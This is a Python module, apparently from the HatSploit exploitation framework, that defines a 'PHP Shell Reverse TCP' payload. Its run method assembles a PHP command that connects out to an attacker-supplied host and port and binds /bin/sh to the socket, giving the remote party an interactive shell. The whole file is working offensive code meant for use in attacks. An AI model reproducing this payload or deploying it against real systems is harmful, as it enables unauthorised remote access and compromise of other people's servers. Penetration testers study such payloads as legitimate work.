"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "PHP Shell Reverse TCP",
            'Payload': "unix/generic/php_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "PHP shell reverse TCP payload.",
            'Architecture': "generic",
            'Platform': "unix",
            'Rank': "high",
            'Type': "reverse_tcp",
        })

    def run(self):
        payload = (
                f"php -r '$sock=fsockopen(\""
                + self.rhost.value
                + "\","
                + self.rport.value
                + ");$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
        )
        return payload
